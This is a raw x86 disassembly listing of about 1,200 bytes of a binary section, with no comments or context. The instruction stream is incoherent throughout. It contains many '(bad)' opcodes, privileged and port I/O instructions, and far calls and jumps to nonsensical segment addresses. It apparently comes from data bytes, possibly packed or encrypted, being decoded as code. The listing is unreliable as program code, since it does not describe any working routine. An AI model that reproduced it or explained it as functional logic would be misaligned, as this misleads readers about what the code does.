  402a30:	test   bh,dl
  402a32:	pop    esi
  402a33:	or     bh,bl
  402a35:	lds    ebp,FWORD PTR [ebx+0x26]
  402a38:	test   al,0x4b
  402a3a:	jmp    FWORD PTR [edx+eiz*1+0x16]
  402a3e:	pop    edi
  402a3f:	jge    0x4029ee
  402a41:	pusha  
  402a42:	dec    edx
  402a43:	inc    edi
  402a44:	jb     0x402ac1
  402a46:	xlat   BYTE PTR ds:[ebx]
  402a47:	repz sahf 
  402a49:	push   edi
  402a4a:	das    
  402a4b:	dec    ecx
  402a4c:	sti    
  402a4d:	sub    DWORD PTR [ebx+0x4c],eax
  402a50:	mov    al,ds:0xe965fbaa
  402a55:	ret    
  402a56:	fdivr  QWORD PTR ds:0xb257cfe0
  402a5c:	fwait
  402a5d:	pusha  
  402a5e:	aad    0x6a
  402a60:	add    DWORD PTR [edx-0x2c],0xffffffe2
  402a64:	xchg   esi,eax
  402a65:	jb     0x402a5c
  402a67:	xchg   BYTE PTR [esi-0x5d],bh
  402a6a:	aam    0x44
  402a6c:	ds mov bl,0x5f
  402a6f:	mov    ss,WORD PTR [edi+esi*1+0x5708a3ee]
  402a76:	add    BYTE PTR [ebp+0x4a43c1b6],bl
  402a7c:	dec    ebp
  402a7d:	cs xchg ecx,eax
  402a7f:	jno    0x402a0a
  402a81:	jne    0x402a7e
  402a83:	aaa    
  402a84:	(bad)  
  402a85:	mov    ecx,DWORD PTR [esi]
  402a87:	or     bh,BYTE PTR [ebp+0x1f]
  402a8a:	das    
  402a8b:	fdiv   QWORD PTR [edi-0x2e]
  402a8e:	sub    ecx,DWORD PTR [edi-0x78067d41]
  402a94:	adc    esi,DWORD PTR [ecx-0x78b7e0a4]
  402a9a:	mov    eax,ds:0x6c2a4b1d
  402a9f:	adc    ebp,esi
  402aa1:	dec    ebp
  402aa2:	xor    eax,0x45f69c67
  402aa7:	(bad)  
  402aa8:	test   al,0x21
  402aaa:	out    dx,al
  402aab:	hlt    
  402aac:	cmp    edx,DWORD PTR [edi]
  402aae:	sbb    DWORD PTR [edx+eax*4-0x327cacd0],ebp
  402ab5:	push   es
  402ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab7:	shl    BYTE PTR [edi-0x6a],1
  402aba:	dec    ecx
  402abb:	or     al,ch
  402abd:	or     ebp,esi
  402abf:	mov    al,ds:0xc39aa0b4
  402ac5:	add    bh,BYTE PTR [edi]
  402ac7:	xchg   ebx,eax
  402ac8:	aaa    
  402ac9:	pop    es
  402aca:	xchg   ecx,eax
  402acb:	lds    ebx,FWORD PTR [esi]
  402acd:	jp     0x402adb
  402acf:	push   0xa4486fd8
  402ad4:	lods   al,BYTE PTR ds:[esi]
  402ad5:	xchg   edi,eax
  402ad6:	mov    al,ds:0x9f69245
  402adb:	cmp    bh,BYTE PTR [ebx-0x47]
  402ade:	sub    ecx,DWORD PTR [esi+eiz*2-0x7ccd7a9f]
  402ae5:	push   edi
  402ae6:	sbb    al,0x11
  402ae8:	push   ebp
  402ae9:	or     DWORD PTR [ebp-0x2cb77039],eax
  402aef:	adc    dl,BYTE PTR [ebx+0x7]
  402af2:	dec    edi
  402af3:	mov    dh,0x84
  402af5:	cwde   
  402af6:	dec    esi
  402af7:	std    
  402af8:	xchg   ebp,eax
  402af9:	jae    0x402ab2
  402afb:	jne    0x402b3b
  402afd:	imul   edi,DWORD PTR [ebx+0x5c],0x2b
  402b01:	sbb    BYTE PTR [esi+ebp*1-0x1],0x55
  402b06:	jl     0x402acc
  402b08:	push   ebp
  402b09:	pop    es
  402b0a:	sbb    al,0xf0
  402b0c:	xchg   ecx,eax
  402b0d:	out    0x65,eax
  402b0f:	stos   BYTE PTR es:[edi],al
  402b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b11:	fldenv [esi-0x1d8eb9e4]
  402b17:	addr16 lahf 
  402b19:	nop
  402b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b1b:	jmp    0x893f806c
  402b20:	pushf  
  402b21:	mov    eax,ds:0x25b90572
  402b26:	push   es
  402b27:	call   0x36df:0xc8210d86
  402b2e:	jg     0x402aff
  402b30:	call   FWORD PTR [esi]
  402b32:	rcr    DWORD PTR [ebx],cl
  402b34:	scas   eax,DWORD PTR es:[edi]
  402b35:	cmp    edx,edx
  402b37:	add    dl,BYTE PTR [ebx+0x38ee4f4b]
  402b3d:	mov    bl,0x72
  402b3f:	and    esi,ecx
  402b41:	add    ebx,esp
  402b43:	outs   dx,BYTE PTR ds:[esi]
  402b44:	fisttp DWORD PTR [edi+0x32]
  402b47:	das    
  402b48:	adc    bh,BYTE PTR [eax-0x40f3ace4]
  402b4e:	dec    ebx
  402b4f:	cmc    
  402b50:	and    edi,0x27
  402b53:	loope  0x402b03
  402b55:	and    DWORD PTR [ebx+esi*2+0x4d],ecx
  402b59:	stc    
  402b5a:	jo     0x402b4d
  402b5c:	nop
  402b5d:	fs in  eax,dx
  402b5f:	dec    edx
  402b60:	mov    esi,0xbc7a206f
  402b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b66:	loop   0x402bcd
  402b68:	test   eax,0xdae82142
  402b6d:	scas   eax,DWORD PTR es:[edi]
  402b6e:	shr    BYTE PTR [ecx],1
  402b70:	xchg   esp,eax
  402b71:	jg     0x402ba1
  402b73:	mov    dh,0x1d
  402b75:	je     0x402bc2
  402b77:	dec    edi
  402b78:	jns    0x402bf6
  402b7a:	cmp    DWORD PTR [ebp-0x3fbaa8ad],0x263f4f4b
  402b84:	mov    cl,0x9a
  402b86:	retf   
  402b87:	repnz cmp edx,DWORD PTR [edi-0x7e]
  402b8b:	fstp   DWORD PTR [ebx]
  402b8d:	int3   
  402b8e:	jae    0x402bc7
  402b90:	xchg   BYTE PTR [ebx],bh
  402b92:	or     BYTE PTR [ebp+ebp*4-0x3e9e7375],cl
  402b99:	sub    eax,0x922f3084
  402b9e:	xchg   edx,eax
  402b9f:	les    esp,FWORD PTR [esi]
  402ba1:	add    BYTE PTR [ebp+0x2b68dda],0x2
  402ba8:	mov    edi,DWORD PTR [esi+0x33e5fa80]
  402bae:	sbb    eax,0x35a5bc76
  402bb3:	dec    edi
  402bb4:	fld    TBYTE PTR [eax]
  402bb6:	ret    
  402bb7:	pop    ecx
  402bb8:	or     DWORD PTR [esi+0x10],esi
  402bbb:	addr16 cdq 
  402bbd:	pushf  
  402bbe:	sub    eax,0x30c17664
  402bc3:	jp     0x402baa
  402bc5:	and    DWORD PTR [ebx+0x63],esp
  402bc8:	in     eax,0x3e
  402bca:	int3   
  402bcb:	enter  0xa501,0x45
  402bcf:	es mov ch,0xb6
  402bd2:	and    ebp,edi
  402bd4:	enter  0x2a64,0xa3
  402bd8:	jne    0x402bba
  402bda:	(bad)  
  402bdb:	lods   al,BYTE PTR ds:[esi]
  402bdc:	ficom  WORD PTR [edx+0x3b]
  402bdf:	sub    ebx,DWORD PTR [ecx]
  402be1:	sbb    al,0x73
  402be3:	adc    eax,0x12e922e7
  402be8:	fdiv   QWORD PTR [esi-0x13bf7859]
  402bee:	inc    ecx
  402bef:	in     al,dx
  402bf0:	or     ah,0x5d
  402bf3:	pop    esi
  402bf4:	aas    
  402bf5:	loope  0x402bb0
  402bf7:	pop    ecx
  402bf8:	fdivr  st(3),st
  402bfa:	adc    BYTE PTR [eax+0x1f],0xa5
  402bfe:	sbb    al,0x3f
  402c00:	mov    ecx,DWORD PTR [ebx+0x8]
  402c03:	jg     0x402bc0
  402c05:	popa   
  402c06:	cs cli 
  402c08:	int3   
  402c09:	icebp  
  402c0a:	js     0x402c30
  402c0c:	sbb    DWORD PTR [ecx+0x47fe034e],edx
  402c12:	jns    0x402bf8
  402c14:	jle    0x402bdb
  402c16:	cld    
  402c17:	mov    eax,0xfd536e69
  402c1c:	call   0x9b76:0xbfb20851
  402c23:	cld    
  402c24:	xchg   edx,eax
  402c25:	push   ss
  402c26:	out    0x56,al
  402c28:	push   edi
  402c29:	jecxz  0x402c46
  402c2b:	sbb    ebx,ebx
  402c2d:	ss push cs
  402c2f:	inc    eax
  402c30:	(bad)  
  402c31:	loop   0x402bfc
  402c33:	or     ah,BYTE PTR [eax+eiz*2]
  402c36:	outs   dx,BYTE PTR ds:[esi]
  402c37:	int    0xfb
  402c39:	mov    BYTE PTR [edi],bh
  402c3b:	sub    DWORD PTR [ebx+0x6ac643a],ecx
  402c41:	inc    esp
  402c42:	add    ch,0xd7
  402c45:	push   edi
  402c46:	inc    edx
  402c47:	stos   BYTE PTR es:[edi],al
  402c48:	jo     0x402cab
  402c4a:	fst    DWORD PTR [ebp-0x550acfb0]
  402c50:	aad    0x56
  402c52:	inc    ecx
  402c53:	ret    
  402c54:	std    
  402c55:	mov    esp,0x9eacad21
  402c5a:	adc    al,0x62
  402c5c:	pop    esp
  402c5d:	cmp    DWORD PTR [edx+ebp*1],edi
  402c60:	mov    eax,ds:0x445e224f
  402c65:	call   0x2324:0x72e66183
  402c6c:	icebp  
  402c6d:	inc    ebx
  402c6e:	(bad)  
  402c6f:	test   al,0x46
  402c71:	or     eax,0xfc1511fe
  402c76:	cmp    esi,DWORD PTR [ecx+0x59e306dc]
  402c7c:	mov    DWORD PTR [ebx],ebx
  402c7e:	mov    esp,esi
  402c80:	arpl   WORD PTR [edx+0x42],cx
  402c83:	mov    WORD PTR [eax+0x2140263d],?
  402c89:	xor    al,0x8c
  402c8b:	mov    dh,0x64
  402c8d:	stc    
  402c8e:	je     0x402c1a
  402c90:	pop    ecx
  402c91:	cmp    edx,DWORD PTR ds:0xc19832
  402c97:	mov    edx,0x16c570c9
  402c9c:	nop
  402c9d:	test   al,0xcb
  402c9f:	fcmovu st,st(0)
  402ca1:	jmp    0x5b63:0xf28452a1
  402ca8:	push   esi
  402ca9:	ds std 
  402cab:	imul   edi,DWORD PTR [ebx],0xd3fec8f8
  402cb1:	jo     0x402d1f
  402cb3:	addr16 xchg ebx,eax
  402cb5:	addr16 mov ah,0x1e
  402cb8:	rcl    DWORD PTR [ebp+0x1f],cl
  402cbb:	sub    bh,BYTE PTR ds:[eax-0x7eb67989]
  402cc2:	sti    
  402cc3:	lahf   
  402cc4:	out    dx,al
  402cc5:	push   esi
  402cc6:	ror    DWORD PTR ds:0x341802ce,cl
  402ccc:	sti    
  402ccd:	sbb    DWORD PTR ds:0xceae8cc5,eax
  402cd3:	(bad)  
  402cd4:	sub    eax,0x143edb81
  402cd9:	repz into 
  402cdb:	mov    esp,0x1670ab94
  402ce0:	mov    ebx,0xbf8b445a
  402ce5:	adc    bh,BYTE PTR [ebx-0xd75ef1c]
  402ceb:	retf   0x5922
  402cee:	cdq    
  402cef:	int3   
  402cf0:	mov    ch,0x42
  402cf2:	jmp    0x7b8c91b9
  402cf7:	ins    DWORD PTR es:[edi],dx
  402cf8:	fimul  WORD PTR [ebp+edi*2+0x48ac8a20]
  402cff:	add    BYTE PTR [esi-0x136e643f],bl
  402d05:	or     BYTE PTR [ebx+0x14],al
  402d08:	test   al,0x2e
  402d0a:	stc    
  402d0b:	inc    edx
  402d0c:	adc    edx,0xd
  402d0f:	in     eax,dx
  402d10:	pushf  
  402d11:	gs add eax,0x73c9df08
  402d17:	adc    BYTE PTR [ecx],bl
  402d19:	xchg   edi,eax
  402d1a:	das    
  402d1b:	mov    edi,ecx
  402d1d:	stos   DWORD PTR es:[edi],eax
  402d1e:	daa    
  402d1f:	cli    
  402d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d21:	fsub   QWORD PTR [edx+0x75]
  402d24:	push   ss
  402d25:	and    eax,0x151af6d9
  402d2a:	je     0x402d5c
  402d2c:	mov    dh,0xc7
  402d2e:	dec    ebp
  402d2f:	cli    
  402d30:	arpl   WORD PTR [edx+0x81b93f7],di
  402d36:	mov    al,ds:0xb70be24a
  402d3b:	punpckldq mm2,DWORD PTR [edi-0x45a0d071]
  402d42:	mov    al,0x86
  402d44:	fwait
  402d45:	jno    0x402ceb
  402d47:	or     eax,ebx
  402d49:	mov    ebp,0xc7d28a86
  402d4e:	push   cs
  402d4f:	cwde   
  402d50:	pop    ebx
  402d51:	push   es
  402d52:	sbb    al,0x67
  402d54:	jne    0x402d78
  402d56:	addr16 xchg edx,eax
  402d58:	pushf  
  402d59:	ret    
  402d5a:	mov    ebp,0xe77fb6ac
  402d5f:	ret    
  402d60:	lock test BYTE PTR [esi],bh
  402d63:	out    dx,al
  402d64:	sub    dh,BYTE PTR [edi-0x4fb0c3ed]
  402d6a:	cwde   
  402d6b:	scas   eax,DWORD PTR es:[edi]
  402d6c:	adc    ebx,DWORD PTR [esi+0x42f94516]
  402d72:	mov    bh,0x35
  402d74:	pop    ebp
  402d75:	xor    edi,DWORD PTR [ebp-0x32b3d150]
  402d7b:	mov    eax,DWORD PTR [edx+0x128471a]
  402d81:	jnp    0x402e02
  402d83:	(bad)  
  402d84:	push   ds
  402d85:	fsub   QWORD PTR [esp+eiz*2+0x66d52f42]
  402d8c:	rol    DWORD PTR [eax+0x1d],1
  402d8f:	push   eax
  402d90:	je     0x402d4c
  402d92:	inc    ecx
  402d93:	pushf  
  402d94:	mov    ds:0xffa497df,al
  402d99:	adc    BYTE PTR [esi+0x29],ch
  402d9c:	sub    BYTE PTR [ebx-0x1d],ch
  402d9f:	xchg   DWORD PTR [esi],edx
  402da1:	and    bl,BYTE PTR ds:0xf30798bb
  402da7:	lods   al,BYTE PTR ds:[esi]
  402da8:	mov    edi,0x9a90179c
  402dad:	mov    bh,BYTE PTR [ecx]
  402daf:	xlat   BYTE PTR ds:[ebx]
  402db0:	dec    esi
  402db1:	cdq    
  402db2:	cdq    
  402db3:	jo     0x402e1d
  402db5:	(bad)
  402db9:	sbb    eax,0x291cc088
  402dbe:	add    BYTE PTR [eax-0x8],dh
  402dc1:	jns    0x402d65
  402dc3:	dec    edi
  402dc4:	xchg   BYTE PTR [ebp+eiz*1+0x7ea0396b],al
  402dcb:	and    ebp,DWORD PTR [ecx]
  402dcd:	loopne 0x402e14
  402dcf:	sbb    edx,0x8f5363f4
  402dd5:	mov    al,BYTE PTR [edx+edx*1]
  402dd8:	(bad)
  402ddb:	out    0xb,eax
  402ddd:	rol    BYTE PTR ds:0xf0b8f286,1
  402de3:	loop   0x402dab
  402de5:	pop    ss
  402de6:	lods   eax,DWORD PTR ds:[esi]
  402de7:	or     DWORD PTR [esi],esi
  402de9:	paddusw mm0,mm6
  402dec:	jnp    0x402e4f
  402dee:	retf   0x7f1a
  402df1:	inc    edx
  402df2:	push   es
  402df3:	mov    ds:0x2bbcab5b,al
  402df8:	fs dec edi
  402dfa:	push   edi
  402dfb:	ror    DWORD PTR [ebx],cl
  402dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dfe:	pop    eax
  402dff:	jnp    0x402ded
  402e01:	dec    eax
  402e02:	sub    ah,BYTE PTR [edi+0xe5b9b00]
  402e08:	mov    bl,0xed
  402e0a:	shl    BYTE PTR [eax-0x36],1
  402e0d:	mov    BYTE PTR [edi-0xf3c3e51],cl
  402e13:	pop    edi
  402e14:	loopne 0x402e7e
  402e16:	inc    edx
  402e17:	dec    esi
  402e18:	mov    al,ds:0x1e480996
  402e1d:	call   0xaffbe1b0
  402e22:	test   eax,0xc4ee0595
  402e27:	push   eax
  402e28:	ins    DWORD PTR es:[edi],dx
  402e29:	mov    ebx,DWORD PTR ds:0xfc7c8950
  402e2f:	repnz repz mov WORD PTR [eax-0xc],?
  402e34:	jecxz  0x402e59
  402e36:	(bad)
  402e39:	aaa    
  402e3a:	push   ds
  402e3b:	sub    edx,DWORD PTR [ebx]
  402e3d:	arpl   WORD PTR [ebp+0x79],bp
  402e40:	stos   DWORD PTR es:[edi],eax
  402e41:	out    dx,eax
  402e42:	gs inc ebx
  402e44:	leave  
  402e45:	push   eax
  402e46:	in     eax,dx
  402e47:	fdiv   QWORD PTR [edi-0x62]
  402e4a:	pop    esi
  402e4b:	pop    ebx
  402e4c:	jae    0x402e57
  402e4e:	adc    eax,0xe84de4d4
  402e53:	dec    ebp
  402e54:	dec    ebx
  402e55:	lahf   
  402e56:	xor    DWORD PTR [ecx-0x163a1238],edi
  402e5c:	test   ch,al
  402e5e:	ins    DWORD PTR es:[edi],dx
  402e5f:	dec    eax
  402e60:	repnz div DWORD PTR [eax]
  402e63:	ss inc edi
  402e65:	xor    ah,BYTE PTR [eax-0x19feca07]
  402e6b:	add    DWORD PTR [edi+0x3c7eb642],ebp
  402e71:	and    DWORD PTR [esi+0x39],edx
  402e74:	sti    
  402e75:	pop    eax
  402e76:	xor    BYTE PTR [edx+0xf],bh
  402e79:	cmp    ebp,edi
  402e7b:	and    al,0x15
  402e7d:	mov    ?,WORD PTR [esi-0x6e]
  402e80:	xchg   edi,eax
  402e81:	(bad)  
  402e82:	mov    eax,ds:0x41b04944
  402e87:	loopne 0x402efc
  402e89:	ret    
  402e8a:	loope  0x402e42
  402e8c:	push   0xffffffa7
  402e8e:	lods   eax,DWORD PTR ds:[esi]
  402e8f:	adc    BYTE PTR [edi],bh
  402e91:	and    al,0x97
  402e93:	icebp  
  402e94:	xor    BYTE PTR [ebx],0x58
  402e97:	or     ebx,DWORD PTR [ecx+0x24]
  402e9a:	jg     0x402e8a
  402e9c:	cld    
  402e9d:	xor    eax,eax
  402e9f:	cmp    al,0xaa
  402ea1:	push   cs
  402ea2:	xchg   esi,eax
  402ea3:	cmc    
  402ea4:	shl    DWORD PTR [esi+0x8],0x88
  402ea8:	adc    bh,ah
  402eaa:	pop    ecx
  402eab:	push   edi
  402eac:	imul   esi,ebp,0x9f6a7304
  402eb2:	sar    DWORD PTR [ebx+eiz*8+0x6f787d3b],1
  402eb9:	rcl    cl,cl
  402ebb:	fadd   DWORD PTR [edx]
  402ebd:	xchg   esp,eax
  402ebe:	dec    eax
  402ebf:	sbb    ecx,eax
  402ec1:	or     esp,0xffffffcc
  402ec4:	cwde   
  402ec5:	(bad)  
  402ec6:	(bad)  
  402ec7:	(bad)  
  402ec9:	neg    DWORD PTR [edi]
  402ecb:	cmp    BYTE PTR [esi],cl
  402ecd:	push   ebp
  402ece:	test   DWORD PTR [ebx+0x4d3611bc],esp
  402ed4:	xor    eax,0x23276466
  402ed9:	pop    esp
  402eda:	and    BYTE PTR [ebp+ebx*2+0xc1e19fb],0xa5
  402ee2:	sub    al,0xf7
  402ee4:	sbb    DWORD PTR [ecx-0x2eadb949],esi
  402eea:	push   edi
  402eeb:	test   eax,0x550ea55c
  402ef0:	loopne 0x402f55
  402ef2:	adc    BYTE PTR ds:0x550bd3e3,dh
  402ef8:	sbb    esp,DWORD PTR [esi+0x580240b0]
  402efe:	jae    0x402f6b
  402f00:	mov    ecx,0xb15a6456
  402f05:	mov    dh,0x85
  402f07:	add    eax,0xee7ec2ee
  402f0c:	fst    st(4)
  402f0e:	rol    DWORD PTR [ecx+0x30],1
  402f11:	test   cl,al
  402f13:	inc    eax
  402f14:	les    esi,FWORD PTR [ebx-0x6e0a7d10]
  402f1a:	aaa    
  402f1b:	outs   dx,BYTE PTR ds:[esi]
  402f1c:	fmul   DWORD PTR [ecx-0x41]
  402f1f:	xlat   BYTE PTR ds:[ebx]
  402f20:	scas   al,BYTE PTR es:[edi]
  402f21:	outs   dx,BYTE PTR ds:[esi]
  402f22:	retf   0x77a1
  402f25:	loopne 0x402f70
  402f27:	and    BYTE PTR [edi+0x29561704],0x5a
  402f2e:	and    DWORD PTR [ebx-0x4dfa557],ebp
  402f34:	add    al,0xa8
  402f36:	imul   ebp,DWORD PTR [ebx+0x41],0x4da2e510
  402f3d:	icebp  
  402f3e:	add    edi,DWORD PTR [edi-0x55b06b0a]
  402f44:	jmp    0x402ec7
  402f46:	fcomi  st,st(1)
  402f48:	xor    BYTE PTR ds:0x47a0be79,dh
  402f4e:	outs   dx,DWORD PTR ds:[esi]
  402f4f:	mov    ecx,0x14921397
  402f54:	sar    BYTE PTR [ecx+0x4321dffc],1
  402f5a:	or     BYTE PTR [eax+ecx*4],cl
  402f5d:	and    eax,0xf7861896
  402f62:	not    BYTE PTR [esp+edi*2]
  402f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f66:	sar    DWORD PTR [edx+0x35],1
  402f69:	(bad)  
  402f6a:	repz ja 0x402f37
  402f6d:	sub    al,0x61
  402f6f:	add    dh,BYTE PTR [eax+0x2]
  402f72:	into   
  402f73:	sub    al,0x61
  402f75:	arpl   WORD PTR [esi+0x79],bx
  402f78:	lea    esi,[edi+0x43]
  402f7b:	xor    al,0xbe
  402f7d:	sbb    ah,ch
  402f7f:	shl    al,1
  402f81:	ds sub eax,0xed8b81d8
  402f87:	xchg   esp,eax
  402f88:	lods   eax,DWORD PTR ds:[esi]
  402f89:	aas    
  402f8a:	fdivr  st(2),st
  402f8c:	cs mov ecx,0xbc9237c4
  402f92:	xor    DWORD PTR [edx+0x19],0xc4766e16
  402f99:	daa    
  402f9a:	push   ds
  402f9b:	fmul   QWORD PTR [edx+0x24300efc]
  402fa1:	leave  
  402fa2:	mov    esp,0x1aff1f83
  402fa7:	test   al,0xdb
  402fa9:	ins    BYTE PTR es:[edi],dx
  402faa:	fwait
  402fab:	jns    0x402fe6
  402fad:	div    DWORD PTR [eax-0x1a]
  402fb0:	out    0xd6,eax
  402fb2:	dec    cx
  402fb4:	inc    eax
  402fb5:	(bad)  
  402fb6:	out    0xf,eax
  402fb8:	mov    cl,0x63
  402fba:	das    
  402fbb:	call   0xb88fe798
  402fc0:	push   esp
  402fc1:	mov    bh,0xb8
  402fc3:	mov    ah,0x58
  402fc5:	rcr    DWORD PTR [esi],1
  402fc7:	lahf   
  402fc8:	pop    ss
  402fc9:	neg    DWORD PTR [ecx-0x75]
  402fcc:	pop    ebx
  402fcd:	bound  esp,QWORD PTR [esi]
  402fcf:	das    
  402fd0:	mov    WORD PTR [eax-0x370717a2],ds
  402fd6:	loopne 0x402f66
  402fd8:	lock mov edx,0xa26988a5
  402fde:	call   0x1d63:0x7ab904c9
  402fe5:	add    ecx,ebx
  402fe7:	jmp    0x71f0f644
  402fec:	jo     0x402fde
  402fee:	aam    0x1f
  402ff0:	cmp    bl,BYTE PTR [edx-0x23]
  402ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ff4:	and    bh,dl
  402ff6:	aas    
  402ff7:	adc    DWORD PTR [esp+ebp*1-0x63],edi
  402ffb:	jns    0x402fca
  402ffd:	cli    
  402ffe:	retf   
  402fff:	jmpw   0x43f
  403003:	sub    ebx,DWORD PTR [ebx]
  403005:	xor    eax,DWORD PTR [eax-0x61]
  403008:	pusha  
  403009:	adc    DWORD PTR [edx-0x57da7165],edx
  40300f:	pop    eax
  403010:	(bad)  
  403011:	mov    dh,0x43
  403013:	pop    ebx
  403014:	in     eax,dx
  403015:	xor    esp,DWORD PTR [edi]
  403017:	adc    cl,dl
  403019:	dec    ebx
  40301a:	push   ebp
  40301b:	pop    ecx
  40301c:	or     ebp,DWORD PTR [esi-0x65]
  40301f:	(bad)  
  403021:	cdq    
  403022:	push   cs
  403023:	sub    BYTE PTR [edi+0x337a4842],ah
  403029:	aaa    
  40302a:	mov    ds:0x146508d1,eax
  40302f:	sbb    al,0xb1
  403031:	push   edi
  403032:	rol    BYTE PTR [eax-0x13],1
  403035:	cli    
  403036:	gs jmp 0xc53cf114
  40303c:	sti    
  40303d:	push   ds
  40303e:	out    dx,al
  40303f:	push   ebx
  403040:	outs   dx,DWORD PTR ds:[esi]
  403041:	cmp    edx,ebx
  403043:	test   eax,0xf1f0b05f
  403048:	and    BYTE PTR [ebp-0x12],al
  40304b:	adc    DWORD PTR [ebx+0xf],ebx
  40304e:	loope  0x402fe4
  403050:	gs push ebx
  403052:	jmp    0x4030c2
  403054:	or     bl,bh
  403056:	xlat   BYTE PTR ds:[ebx]
  403057:	dec    ebx
  403058:	lea    edx,[ebp-0x41]
  40305b:	daa    
  40305c:	mov    ds:0x14ac14d3,eax
  403061:	sbb    DWORD PTR [esi+ebx*1],ebx
  403064:	adc    DWORD PTR [ebx-0x76],ebp
  403067:	cli    
  403068:	pop    eax
  403069:	cmc    
  40306a:	mov    ecx,0xfd934c97
  40306f:	mov    ch,0x10
  403071:	xchg   ebp,eax
  403072:	addr16 sbb al,0x28
  403075:	sub    ecx,DWORD PTR [ebx+0x54]
  403078:	jns    0x4030a8
  40307a:	(bad)  
  40307b:	push   DWORD PTR [esi+0x74]
  40307e:	sbb    al,0x6c
  403080:	jae    0x403070
  403082:	jae    0x40301b
  403084:	mov    ds:0x604bed86,eax
  403089:	fidivr WORD PTR [ebp-0x38]
  40308c:	sub    al,0xc8
  40308e:	inc    ebx
  40308f:	mov    al,ds:0x9b738c93
  403094:	add    eax,0x5887b14
  403099:	data16 scas al,BYTE PTR es:[edi]
  40309b:	xor    DWORD PTR [ecx+0x1],edx
  40309e:	ret    
  40309f:	loopne 0x4030be
  4030a1:	dec    ecx
  4030a2:	xchg   edi,eax
  4030a3:	dec    esp
  4030a4:	loopne 0x403081
  4030a6:	test   BYTE PTR [eax-0x2c08c470],cl
  4030ac:	ins    DWORD PTR es:[edi],dx
  4030ad:	dec    edi
  4030ae:	je     0x403079
  4030b0:	jae    0x403064
  4030b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030b3:	test   DWORD PTR [edx],ebx
  4030b5:	and    ah,BYTE PTR ds:0x82333f28
  4030bb:	fld    TBYTE PTR [eax-0x2726b69a]
  4030c1:	aaa    
  4030c2:	jnp    0x40312b
  4030c4:	mov    dh,BYTE PTR [ebx+0x46]
  4030c7:	gs loop 0x40312a
  4030ca:	jmp    0x3959:0xf9c2cc97
  4030d1:	rol    dh,cl
  4030d3:	xchg   edx,eax
  4030d4:	push   ss
  4030d5:	sub    esi,ebx
  4030d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030d8:	jl     0x40307b
  4030da:	aam    0xee
  4030dc:	in     eax,0x7
  4030de:	into   
  4030df:	xchg   BYTE PTR [eax+0x1e],cl
  4030e2:	js     0x4030c6
  4030e4:	jnp    0x40309c
  4030e6:	in     eax,0xd3
  4030e8:	dec    edx
  4030e9:	pop    ebx
  4030ea:	inc    cl
  4030ec:	push   edx
  4030ed:	inc    esp
  4030ee:	jl     0x40309d
  4030f0:	(bad)  
  4030f1:	popa   
  4030f2:	jge    0x4030c9
  4030f4:	sub    dh,0xc
  4030f7:	sbb    DWORD PTR [eax],esi
  4030f9:	int3   
  4030fa:	push   ds
  4030fb:	push   0x3bfba485
  403100:	adc    ah,BYTE PTR [ecx-0x16]
  403103:	mov    cl,0x37
  403105:	test   BYTE PTR [ebx-0x4c],0xab
  403109:	jmp    0x30bc:0xc6b940d2
  403110:	test   DWORD PTR [edi-0x54],ebx
  403113:	sub    BYTE PTR [eax+ebx*2-0x61],ah
  403117:	fucom  st(7)
  403119:	fcom   st(0)
  40311b:	push   cs
  40311c:	loopne 0x403113
  40311e:	push   esi
  40311f:	or     eax,0x1e15b68b
  403124:	test   DWORD PTR [edi-0x29132e30],0xb9dca7e4
  40312e:	call   0xa8a2ae37
  403133:	daa    
  403134:	mov    al,ds:0x3cc26921
  403139:	and    DWORD PTR [esi+0x5663d48f],ecx
  40313f:	push   ebx
  403140:	jae    0x403120
  403142:	jmp    0xa197:0xde359099
  403149:	pop    ss
  40314a:	mov    ds:0x9db57f00,al
  40314f:	scas   al,BYTE PTR es:[edi]
  403150:	cmp    BYTE PTR [edx+0x4e80fd6f],bh
  403156:	adc    eax,0x86f7ddd4
  40315b:	pop    eax
  40315c:	xchg   ebp,eax
  40315d:	sub    DWORD PTR [edx+0x22ba3750],edi
  403163:	in     al,dx
  403164:	outs   dx,BYTE PTR ds:[esi]
  403165:	jnp    0x4031c5
  403167:	push   esp
  403168:	ins    BYTE PTR es:[edi],dx
  403169:	outs   dx,BYTE PTR ds:[esi]
  40316b:	xchg   edx,eax
  40316c:	jg     0x40317c
  40316e:	test   BYTE PTR [esi-0x10],bl
  403171:	and    DWORD PTR ds:0xf741b0d1,esi
  403177:	mov    ebx,0xef0239c5
  40317c:	jnp    0x4031dc
  40317e:	mov    esp,DWORD PTR [edx+0x156b46e7]
  403184:	in     eax,0x6c
  403186:	rcl    DWORD PTR [ebx],0xef
  403189:	addr16 retf 0x8204
  40318d:	daa    
  40318e:	jg     0x4031ce
  403190:	test   BYTE PTR [eax-0x2],0xc3
  403194:	fnsave [ecx]
  403196:	adc    DWORD PTR [edx+0x4d85e111],esp
  40319c:	cs shr BYTE PTR es:[ecx-0x48178885],1
  4031a4:	pop    esi
  4031a5:	sub    eax,DWORD PTR [ebx+0x6cc0a9de]
  4031ab:	adc    DWORD PTR [edi-0x11],ebp
  4031ae:	pop    ss
  4031af:	jle    0x4031e7
  4031b1:	xchg   edx,eax
  4031b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031b3:	shr    BYTE PTR [ecx-0x3e529b80],1
  4031b9:	call   0x8c904114
  4031be:	sub    ebp,ebx
  4031c0:	xchg   BYTE PTR [esi+esi*1+0x13],dl
  4031c4:	or     al,0x44
  4031c6:	add    BYTE PTR [ebx],ah
  4031c8:	sbb    DWORD PTR [edx-0x25],eax
  4031cb:	pop    ecx
  4031cc:	enter  0x4f8,0xd9
  4031d0:	jmp    0x76a6:0x41afc47d
  4031d7:	pop    esi
  4031d8:	sub    ebp,DWORD PTR [ecx+eax*2-0x67eed678]
  4031df:	xor    DWORD PTR [eax+0x889ff96],edi
  4031e5:	es xchg ebp,esp
  4031e8:	shr    DWORD PTR [esp+edx*8],cl
  4031eb:	xchg   esi,eax
  4031ec:	jp     0xb7374f5d
